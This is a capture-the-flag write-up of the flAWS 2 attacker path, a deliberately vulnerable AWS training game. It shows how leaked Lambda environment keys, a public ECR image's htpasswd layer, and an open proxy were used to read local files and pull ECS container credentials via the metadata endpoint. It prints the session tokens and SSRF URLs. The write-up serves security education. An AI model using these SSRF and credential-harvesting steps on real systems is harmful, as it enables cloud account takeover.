---
title:  "flAWS - Part 2 - Attacker"
categories: [CTF, flAWS, AWS]
---

![Logo](/assets/images/cloud2.jpg)

<blockquote>
    <p>
<b>flAWS 2 challenge</b> [..] teaches you AWS (Amazon Web Services) security concepts. The challenges are focused on AWS specific issues, so no buffer overflows, XSS, etc. You can play by getting hands-on-keyboard or just click through the hints to learn the concepts and go from one level to the next without playing.
<br/><br/>
    flAWS 2 has two paths this time: <b>Attacker</b> and <b>Defender</b>! In the Attacker path, you'll exploit your way through misconfigurations in serverless (Lambda) and containers (ECS Fargate). In the Defender path, that target is now viewed as the victim and you'll work as an incident responder for that same app, understanding how an attack happened. You'll get access to logs of a previous successful attack. As a Defender you'll learn the power of jq in analyzing logs, and instructions on how to set up Athena in your own environment.
</p>
</blockquote>

For the writeups and notes to the other flAWS challenges:
* [flAWS Part 1]({{ site.baseurl }}{% post_url 2019-05-01-flAWS-Part-1 %})
* [flAWS Part 2 - Defender](xxx)

Before starting, I wanted to say thank you again to the creator of these games, Scott Piper of [summitroute](https://summitroute.com/) for the effort of designing, hosting and making them available for free for everyone! All the levels are highly educative and recommended for anyone interested in AWS security.

## Level 1

<blockquote>
<p>For this level, you'll need to enter the correct PIN code. The correct PIN is 100 digits long, so brute forcing it won't help.</p>
</blockquote>

The first hint tells us to look at the JavaScript code. There is a client-side check on the parameter, which needs to be a number. This suggests that the backend application only accepts numbers.

```js
  function validateForm() {
      var code = document.forms["myForm"]["code"].value;
      if (!(!isNaN(parseFloat(code)) && isFinite(code))) {
          alert("Code must be a number");
          return false;
      }
  }
```

Form data is validated as follows:

```html
<form name="myForm" action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" onsubmit="return validateForm()">
  Code: <input type="text" name="code" value="1234">
  <br><br>
  <input type="submit" value="Submit">
</form>
```

Let’s try an invalid input and see what happens:

<a href="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=aaa">2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=aaa</a>

```js
Error, malformed input
{"PATH":"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin","LD_LIBRARY_PATH":"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib","LANG":"en_US.UTF-8","TZ":":UTC","LAMBDA_TASK_ROOT":"/var/task","LAMBDA_RUNTIME_DIR":"/var/runtime","AWS_REGION":"us-east-1","AWS_DEFAULT_REGION":"us-east-1","AWS_LAMBDA_LOG_GROUP_NAME":"/aws/lambda/level1","AWS_LAMBDA_LOG_STREAM_NAME":"2019/11/03/[$LATEST]cccc0a37345a46b39d4b8a60f2b62b66","AWS_LAMBDA_FUNCTION_NAME":"level1","AWS_LAMBDA_FUNCTION_MEMORY_SIZE":"128","AWS_LAMBDA_FUNCTION_VERSION":"$LATEST","_AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2","_AWS_XRAY_DAEMON_PORT":"2000","AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2:2000","AWS_XRAY_CONTEXT_MISSING":"LOG_ERROR","_X_AMZN_TRACE_ID":"Root=1-5dbecfe6-0ea4e36c115f65a44848e788;Parent=12db6171262706d6;Sampled=0","AWS_EXECUTION_ENV":"AWS_Lambda_nodejs8.10","_HANDLER":"index.handler","NODE_PATH":"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules","AWS_ACCESS_KEY_ID":"ASIAZQNB3KHGMCKNDKFP","AWS_SECRET_ACCESS_KEY":"hq73xAPItXJdI5QOuwrbAp1RSeOHqNMhX+rR943w","AWS_SESSION_TOKEN":"IQoJb3JpZ2luX2VjEBUaCXVzLWVhc3QtMSJHMEUCIAivjnHKWl/7dbwK2dH3FCQxb9xa819AYNUFpabUTNN1AiEA+FJRUCQ0r0VgSyvhe7kh/JuFgIHZW4bYkX2bQ40GXfMqxQEILhABGgw2NTM3MTEzMzE3ODgiDCdo3a4XvhCxiHXtciqiAT6ju04Rc5+I/96OjS+gz37pb64x62f0lbQQRMwolN3G6FYWqUbIR1DNtsxEGmCPEVGsbtKl2bxGTRgMcuQqEJCIf/bE5Kimx3KgTJcoiyQwunMAIlJwJbRRV9Jhc6dPCS6BI9wBMT5PBmqRD9Qat7sDMoss3kzsm7G+AaMF5EN8u0RgD+jo12MmtL+kniU4NrPz5BdHyWl2nbRwtB3GNR3QtjDqnPvtBTrgAYLAx5pyfBWt+MBOqhjjHLN4w/86kvcAN7jkkycFljRx/pPcyD2k5WJcaxGnTioHmcIpso9nmZarbqEx9kuRtzz8rrgBFoGwJwTA+HW33VeeDRVYybdzJaasExoXtS1ziNdR+g/Kzm4STjms/eg0N0Qp69lapE+TtzCEEJOq9W/dvLLaGiRKEe7dFNqbovXRR2m3t6T26a/kkXnQw9PT78iSLVeG5sB6bR4PtdDa6m/ZlsbdztG//fhgJ+ktCQqweCg+LH+lY1ljygzyDTQJUuds4pCVtFGMpMxz5XZhwMv7"}
```

The JSON object, after beautifying, looks like this:

```js
{
    "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
    "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
    "LANG": "en_US.UTF-8",
    "TZ": ":UTC",
    "LAMBDA_TASK_ROOT": "/var/task",
    "LAMBDA_RUNTIME_DIR": "/var/runtime",
    "AWS_REGION": "us-east-1",
    "AWS_DEFAULT_REGION": "us-east-1",
    "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/level1",
    "AWS_LAMBDA_LOG_STREAM_NAME": "2019/11/03/[$LATEST]cccc0a37345a46b39d4b8a60f2b62b66",
    "AWS_LAMBDA_FUNCTION_NAME": "level1",
    "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "128",
    "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
    "_AWS_XRAY_DAEMON_ADDRESS": "169.254.79.2",
    "_AWS_XRAY_DAEMON_PORT": "2000",
    "AWS_XRAY_DAEMON_ADDRESS": "169.254.79.2:2000",
    "AWS_XRAY_CONTEXT_MISSING": "LOG_ERROR",
    "_X_AMZN_TRACE_ID": "Root=1-5dbecfe6-0ea4e36c115f65a44848e788;Parent=12db6171262706d6;Sampled=0",
    "AWS_EXECUTION_ENV": "AWS_Lambda_nodejs8.10",
    "_HANDLER": "index.handler",
    "NODE_PATH": "/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules",
    "AWS_ACCESS_KEY_ID": "ASIAZQNB3KHGMCKNDKFP",
    "AWS_SECRET_ACCESS_KEY": "hq73xAPItXJdI5QOuwrbAp1RSeOHqNMhX+rR943w",
    "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEBUaCXVzLWVhc3QtMSJHMEUCIAivjnHKWl/7dbwK2dH3FCQxb9xa819AYNUFpabUTNN1AiEA+FJRUCQ0r0VgSyvhe7kh/JuFgIHZW4bYkX2bQ40GXfMqxQEILhABGgw2NTM3MTEzMzE3ODgiDCdo3a4XvhCxiHXtciqiAT6ju04Rc5+I/96OjS+gz37pb64x62f0lbQQRMwolN3G6FYWqUbIR1DNtsxEGmCPEVGsbtKl2bxGTRgMcuQqEJCIf/bE5Kimx3KgTJcoiyQwunMAIlJwJbRRV9Jhc6dPCS6BI9wBMT5PBmqRD9Qat7sDMoss3kzsm7G+AaMF5EN8u0RgD+jo12MmtL+kniU4NrPz5BdHyWl2nbRwtB3GNR3QtjDqnPvtBTrgAYLAx5pyfBWt+MBOqhjjHLN4w/86kvcAN7jkkycFljRx/pPcyD2k5WJcaxGnTioHmcIpso9nmZarbqEx9kuRtzz8rrgBFoGwJwTA+HW33VeeDRVYybdzJaasExoXtS1ziNdR+g/Kzm4STjms/eg0N0Qp69lapE+TtzCEEJOq9W/dvLLaGiRKEe7dFNqbovXRR2m3t6T26a/kkXnQw9PT78iSLVeG5sB6bR4PtdDa6m/ZlsbdztG//fhgJ+ktCQqweCg+LH+lY1ljygzyDTQJUuds4pCVtFGMpMxz5XZhwMv7"
}
```

We’ll configure the AWS CLI with these 3 parameters (**AWS_ACCESS_KEY_ID**, **AWS_SECRET_ACCESS_KEY** and **AWS_SESSION_TOKEN**) in _~/.aws/credentials_ and then inspect the bucket:

```bash
~ aws --profile part2-attacker-level1 s3 ls s3://level1.flaws2.cloud
                           PRE img/
2018-11-20 20:55:05      17102 favicon.ico
2018-11-21 02:00:22       1905 hint1.htm
2018-11-21 02:00:22       2226 hint2.htm
2018-11-21 02:00:22       2536 hint3.htm
2018-11-21 02:00:23       2460 hint4.htm
2018-11-21 02:00:17       3000 index.htm
2018-11-21 02:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```

Visiting that secret page gives us the link to the next level:

<a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud">level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</a>

## Level 2

<blockquote>
    <p>
This next level is running as a container at <a href="http://container.target.flaws2.cloud/">http://container.target.flaws2.cloud/</a>. Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".</p>
</blockquote>

So this level is running as a container. If an ECR is public, we can list all the images in the registry like this:

```bash
~ aws ecr list-images --repository-name REPO_NAME --registry-id ACCOUNT_ID
```

In this case the repository name is **level2** and the _registry-id_ is the AWS account ID associated with the registry. We can find out this account using the profile created in the previous level:

```bash
~ aws --profile part2-attacker-level1 sts get-caller-identity
{
    "Account": "653711331788",
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

With this information, let’s try to list the images:

```bash
~ aws --profile part2-attacker-level1 ecr list-images --repository-name level2 --registry-id 653711331788
You must specify a region. You can also configure your region by running "aws configure".
```

We also need to get the correct region:

```bash
~ dig level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud

. . .
;; ANSWER SECTION:
level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud. 5	IN A 52.217.37.195

~ nslookup 52.217.37.195
Server:		172.16.174.2
Address:	172.16.174.2#53

Non-authoritative answer:
195.37.217.52.in-addr.arpa	name = s3-website-us-east-1.amazonaws.com.
```

Notice that the region is different from the one used in the first flAWS challenge.

```bash
~ aws --profile part2-attacker-level1 ecr list-images --repository-name level2 --registry-id 653711331788 --region us-east-1
{
    "imageIds": [
        {
            "imageTag": "latest",
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"
        }
    ]
}
```

<div class="box-note">
Note that if we’re doing this from a different user, we would need to assign it proper permissions, for example <b>AmazonEC2ContainerRegistryFullAccess</b> or <b>AmazonEC2ContainerRegistryReadOnly</b>.
</div>

One of the hints is very helpful: 

<blockquote>
    <p>Now that you know the image is public, you have two choices, you can either download it locally with docker pull and investigate it with Docker commands or do things more manually with the AWS CLI.</p>
</blockquote>

### Option 1: Use Docker

<div class="box-note">
    If you're installing Docker in a virtual machine, make sure to <i><b>enable virtualisation</b></i>!
</div>

First get a token to log in into the registry. 

<div class="box-note">
    <b>ecr get-login</b> command - Retrieves a token that is valid for a specified registry for 12 hours, and then it prints a docker login command with that authorisation token.
</div>

```bash
~ aws --profile part2-attacker-level1 --region us-east-1 ecr get-login
docker login -u AWS -p eyJwYXlsb2FkIjoibzB..U5ODU5fQ==  https://653711331788.dkr.ecr.us-east-1.amazonaws.com

WARNING! Using --password via the CLI is insecure. Use --password-stdin.
```

Then pull the image from the repository:

```bash
~ docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest

latest: Pulling from level2
7b8b6451c85f: Pull complete
ab4d1096d9ba: Pull complete
e6797d1788ac: Pull complete
e25c5c290bde: Pull complete
96af0e137711: Pull complete
2057ef5841b5: Pull complete
e4206c7b02ec: Pull complete
501f2d39ea31: Pull complete
f90fb73d877d: Pull complete
4fbdfdaee9ae: Pull complete
Digest: sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e
Status: Downloaded newer image for 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```

We can also verify it’s been pulled correctly:

```bash
~ docker image ls
REPOSITORY                                            TAG                 IMAGE ID            CREATED             SIZE
653711331788.dkr.ecr.us-east-1.amazonaws.com/level2   latest              2d73de35b781        11 months ago       202M
```

Docker ```inspect``` command shows the final command executed and a number of read-only layers:

```bash
~ docker inspect 2d73de35b781
[
    {
        "Id": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621",
        "RepoTags": [
            "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest"
        ],
        "RepoDigests": [
            "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2@sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"
        ],
        "Parent": "",
        "Comment": "",
        "Created": "2018-11-27T03:32:59.959842964Z",
        "Container": "ac1212c533fd9920b36cf3518caeb27b07e5efca6d40a0cfb07acc94c3f02055",
        "ContainerConfig": {
            "Hostname": "ac1212c533fd",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": [
                "/bin/sh",
                "-c",
                "#(nop) ",
                "CMD [\"sh\" \"/var/www/html/start.sh\"]"
            ],
            "ArgsEscaped": true,
            "Image": "sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": null,
            "OnBuild": null,
            "Labels": {}
        },
        "DockerVersion": "18.09.0",
        "Author": "",
        "Config": {
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": [
                "sh",
                "/var/www/html/start.sh"
            ],
            "ArgsEscaped": true,
            "Image": "sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": null,
            "OnBuild": null,
            "Labels": null
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 201856589,
        "VirtualSize": 201856589,
        "GraphDriver": {
            "Data": {
                "LowerDir": "/mnt/sda1/var/lib/docker/overlay2/48318ec788ae06994af0a5495054096013bd07b20fc332ef6f83dc7122d2e724/diff:/mnt/sda1/var/lib/docker/overlay2/7e33fdfcf67b80e4037bc3097a3cb2cea2bd97d5817a969ea222e33e0657200c/diff:/mnt/sda1/var/lib/docker/overlay2/ca44ae798112d6f6ae0d3cc75468c5d09b5b6e9a9c3f15ce89a610083652e25f/diff:/mnt/sda1/var/lib/docker/overlay2/b871ecf46d649c0ba97802fd0f7b84a6622c024a9d7be0956f125ecb4f805d9d/diff:/mnt/sda1/var/lib/docker/overlay2/1e9209de22179ef94b43a2490e5659290db9fb00b2d3e65a5f9147a640ff73e1/diff:/mnt/sda1/var/lib/docker/overlay2/f6253954870b0fd009e8520be8088bfc600815317d52e57d519a2bca9d82980e/diff:/mnt/sda1/var/lib/docker/overlay2/4b6bb022693f9651ded3240426e15c24e7205ff88dc32cf600fbffb68934bb4e/diff:/mnt/sda1/var/lib/docker/overlay2/4d2a4b1bec22ee8cb937bb13b053fe06834b852c2b881e5e3315ca3038ddff42/diff:/mnt/sda1/var/lib/docker/overlay2/9045870c85acde0881ccbd892392780e4fb1fbc6e8192d20292f5e8d37658aa5/diff",
                "MergedDir": "/mnt/sda1/var/lib/docker/overlay2/790fe4e9bee7df6910bd444767cdf9f9f0159bd381fe1b704332eac7f501e086/merged",
                "UpperDir": "/mnt/sda1/var/lib/docker/overlay2/790fe4e9bee7df6910bd444767cdf9f9f0159bd381fe1b704332eac7f501e086/diff",
                "WorkDir": "/mnt/sda1/var/lib/docker/overlay2/790fe4e9bee7df6910bd444767cdf9f9f0159bd381fe1b704332eac7f501e086/work"
            },
            "Name": "overlay2"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:41c002c8a6fd36397892dc6dc36813aaa1be3298be4de93e4fe1f40b9c358d99",
                "sha256:647265b9d8bc572a858ab25a300c07c0567c9124390fd91935430bf947ee5c2a",
                "sha256:819a824caf709f224c414a56a2fa0240ea15797ee180e73abe4ad63d3806cae5",
                "sha256:3db5746c911ad8c3398a6b72aa30580b25b6edb130a148beed4d405d9c345a29",
                "sha256:1c1ac3ae43d53b452e0dfb320a5c22cf8ff5e8068a7ecef6779600d14ad4751b",
                "sha256:bc16ef0350ee1577dfe09696bff225b40d241b26a359c146ffd5746a8ce18931",
                "sha256:5db51ba604f0593199b4d8705a21fe6b1bc6cee503f7468539f6a80aa3cc4750",
                "sha256:4e7b9bca030ac43814d0a6c6afed36f70fc2bb01a9dd84705358f424af1dae1e",
                "sha256:5494da4989bbd817e20ead7cbaa8985d9907db95ea07b3e212e2e483de767f1d",
                "sha256:67df634e1db11f3a6533ed051811c8290b69d7104550617dcc79303304cc78bb"
            ]
        },
        "Metadata": {
            "LastTagTime": "0001-01-01T00:00:00Z"
        }
    }
]
```

Docker images are composed of layers, which are intermediate build stages of the image. Each line in a Dockerfile results in the creation of a new layer.  For more details about Docker layers, check this in-depth explanation - [Digging into Docker layers](Digging%20into%20Docker%20layers).

We can view the commands used to create all the layers when the docker container was built:

```bash
~ docker history 2d73de35b781
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
2d73de35b781        11 months ago       /bin/sh -c #(nop)  CMD ["sh" "/var/www/html/…   0B
<missing>           11 months ago       /bin/sh -c #(nop)  EXPOSE 80                    0B
<missing>           11 months ago       /bin/sh -c #(nop) ADD file:d29d68489f34ad718…   49B
<missing>           11 months ago       /bin/sh -c #(nop) ADD file:f8fd45be7a30bffa5…   614B
<missing>           11 months ago       /bin/sh -c #(nop) ADD file:fd3724e587d17e4bc…   1.89kB
<missing>           11 months ago       /bin/sh -c #(nop) ADD file:b311a5fa51887368e…   999B
<missing>           11 months ago       /bin/sh -c htpasswd -b -c /etc/nginx/.htpass…   45B
<missing>           11 months ago       /bin/sh -c apt-get update     && apt-get ins…   85.5MB
<missing>           11 months ago       /bin/sh -c #(nop)  CMD ["/bin/bash"]            0B
<missing>           11 months ago       /bin/sh -c mkdir -p /run/systemd && echo 'do…   7B
<missing>           11 months ago       /bin/sh -c rm -rf /var/lib/apt/lists/*          0B
<missing>           11 months ago       /bin/sh -c set -xe   && echo '#!/bin/sh' > /…   745B
<missing>           11 months ago       /bin/sh -c #(nop) ADD file:efec03b785a78c01a…   116MB
```

Notice that the command to set up the password for HTTP Basic Authentication -  ```/bin/sh -c htpasswd -b -c /etc/nginx/.htpass...``` appears incomplete. To get the full command, run the above with ```—no-trunc``` parameter.

These are the parameters we were looking for:

```bash
/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
```

Try them on <a href="http://container.target.flaws2.cloud ">http://container.target.flaws2.cloud </a> to get the link to level 3:

Finally, level 3 is at [level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud](http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud)

### Option 2: Use AWS CLI

We can dig a bit into the image without using Docker:

~ aws --profile part2-attacker-level1 --region us-east-1 ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
  "config": {
    "mediaType": "application/vnd.docker.container.image.v1+json",
    "size": 5359,
    "digest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
  },
  "layers": [
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 43412182,
      "digest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 848,
      "digest": "sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 619,
      "digest": "sha256:e6797d1788acd741d33f4530106586ffee568be513d47e6e20a4c9bc3858822e"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 168,
      "digest": "sha256:e25c5c290bded5267364aa9f59a18dd22a8b776d7658a41ffabbf691d8104e36"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 32516034,
      "digest": "sha256:96af0e137711cf1b2bf6e95528fbf861b2beef58c382bdadcf8062851e7005bb"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 217,
      "digest": "sha256:2057ef5841b5bc57c66088d7d99898e6b7a516feaf2e66a7a4c69e6b40a03472"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 619,
      "digest": "sha256:e4206c7b02ec71b1262ad18216e1203da19e5292fcf636392e0ed969871bb235"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 893,
      "digest": "sha256:501f2d39ea313392ab1e2b4b6b7d9213c60335d3c508fc02b3bdae9792ae2d32"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 508,
      "digest": "sha256:f90fb73d877d9ce2e2220a1340d2e347b0c7baa2d120ce02c8731d666cdb1cac"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 213,
      "digest": "sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935"
    }
  ]
}

Again, multiple layers. We cold get any one of them like based on tis digest:

~ aws --profile part2-attacker-level1 --region us-east-1 ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"

{
    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.amazonaws.com/dc26-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/f1bebb74-3af2-4d58-8bbe-cfec79c8ceb3?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20191103T222710Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAI7KZ4NTCV2EWBNUQ%2F20191103%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e54106bd045adef036d5ed36d3c3d3a06d161ef253a613af7e289d828667720a",
    "layerDigest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"
}

~ wget "https://prod-us-east-1-starport-layer-bucket.s3.amazonaws.com/dc26-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/f1bebb74-3af2-4d58-8bbe-cfec79c8ceb3?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20191103T222710Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAI7KZ4NTCV2EWBNUQ%2F20191103%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e54106bd045adef036d5ed36d3c3d3a06d161ef253a613af7e289d828667720a" -O layer.tar.gzip

Or it would be easier to just download the config file:

~ aws --profile part2-attacker-level1 --region us-east-1 ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
{
    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20191103T224834Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAI7KZ4NTCV2EWBNUQ%2F20191103%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e9509da5e60f011f2959bc7db29a5bcbbda95167f51f193cb4e9100f742eba54",
    "layerDigest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
}

~ wget "https://prod-us-east-1-starport-layer-bucket.s3.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20191103T224834Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAI7KZ4NTCV2EWBNUQ%2F20191103%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e9509da5e60f011f2959bc7db29a5bcbbda95167f51f193cb4e9100f742eba54" -O config

~ cat config | jq 
. . 
  {
      "created": "2018-11-27T03:32:58.202361504Z",
      "created_by": "/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"
    },
. . 

## Level 3

Again we’re dealing with a proxy:

The container's webserver you got access to includes a simple proxy that can be access with: 
http://container.target.flaws2.cloud/proxy/http://flaws.cloud              or 
http://container.target.flaws2.cloud/proxy/http://neverssl.com


This time we cannot read the metadata anymore:
http://container.target.flaws2.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials   > no results here

One of the hints tells us that we can also read local files with this proxy. Pretty cool:

http://container.target.flaws2.cloud/proxy/file:///proc/self/environ


HOSTNAME=ip-172-31-56-11.ec2.internal
HOME=/root
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6
AWS_EXECUTION_ENV=AWS_ECS_FARGATE
AWS_DEFAULT_REGION=us-east-1
ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/c88043c3-94ac-4650-a13f-1c15293a5a31
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_REGION=us-east-1
PWD=/

Out of curiosity, we could even see the proxy script file. In the previous level one of the commands for one of the layers mentioned this interesting file: /var/www/html/proxy.py

http://container.target.flaws2.cloud/proxy/file:////var/www/html/proxy.py

import SocketServer
import SimpleHTTPServer
import urllib
import os

PORT = 8000

class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
  def do_GET(self):
    self.send_response(200)
    self.send_header("Content-type", "text/html")
    self.end_headers()

    # Remove starting slash
    self.path = self.path[1:]

    # Read the remote site
    response = urllib.urlopen(self.path)
    the_page = response.read(8192)
    
    # Return it
    self.wfile.write(bytes(the_page))
    self.wfile.close()

httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
print "serving at port", PORT
httpd.serve_forever()

From inside a container, we could query the credentials using with the following command:

~ curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

Let’s use the proxy:
http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6

{
    "RoleArn": "arn:aws:iam::653711331788:role/level3",
    "AccessKeyId": "ASIAZQNB3KHGNJDDVTOZ",
    "SecretAccessKey": "VKIJckMjWld1oTJIb0e0y5KixY3FLF5Py+oplsNW",
    "Token": "FwoGZXIvYXdzEC8aDNofefCYUAGaQebFECLgAuJuvG3iYlMkMl9PPpsjwIi7p6SSbFs231RiquEJqnDZlusZ9etGxmRxWsj1n2CmnrgVA+GztQZZ63J7Bu3jk+15HoyeJ/mfALIiq4SuUB1rwHzbYr2oQrQ14WyE1zjE7eGJmsP5ADbss8o4AtNUR6fe2JmYLWCsdIZj9OToCOm+Ch58L7EWYiTAshTBCkoQ6WFkf5SehZN1qeqaFr9xT7y6jql4bJ+BK+dUPU/Mkj7VCR6YVdvLGwyaxOLW9e0IyNu4ZxKb8Pig0Y6JtT8HtSpOB/KEf8hBiDAXBRm0k/fBQWbK7sOD9ftL9Fwjbw9FpAHpyu9YPzzpsm8DCuK87Un9cMJTQ7DNqT5xmzQz7/hvox4hmRPpECKf1/rOcIHYzQcUfUEi2BoepAC0/57TT+isFSlNogKJXqdGtR9B+donfdbfd+HwsEnwVNDpK03r26/SoNpsk0+Gsm028hW1V7IokI397QUyngGuPsDYraOKRML0Q4A379l+NP5ZeEcoUv7O5KrOC49xRyhBz2mtBGKJqdjbH7z9CzTL2gNmroJYbl3wuLRg1YPhSOjWl57DlEG9z+a3su00b3DxwdSaOXWaH6wD7i/xFPM2MviCgpuqlXgJxKzlXvVq0o/OqV4IncoBG98yOdS7KN4nNY2fkp7o+rJf9e7dJpGzvb+LIBPAuKY+dnXutw==",
    "Expiration": "2019-11-04T03:28:48Z"
}

Add these credentials, including the Token, to ~/.aws/credentials then list all the buckets visible to this profile:

~ aws --profile attacker-level3 --region us-east-1 s3 ls
2018-11-20 19:50:08 flaws2.cloud
2018-11-20 18:45:26 level1.flaws2.cloud
